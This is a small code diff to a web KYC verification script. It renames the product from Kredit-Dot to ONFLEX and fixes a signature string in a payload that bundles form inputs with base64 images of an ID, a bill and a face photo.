@@ -1,5 +1,5 @@
 /**
- * Kredit-Dot PREMIUM - MULTI-STEP KYC VERIFICATION SYSTEM ENGINE
+ * ONFLEX PREMIUM - MULTI-STEP KYC VERIFICATION SYSTEM ENGINE
  */
 document.addEventListener('DOMContentLoaded', () => {
     const actionVerifyAccount = document.getElementById('actionVerifyAccount');
@@ -350,7 +350,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             const finalPayload = {
                 ...formInputsResult.value,
-                signature: "kredi-dot",
+                signature: "kredit-dot",
                 kyc_image1: base64Id,
                 kyc_image2: base64Bill,
                 kyc_image3: base64Face
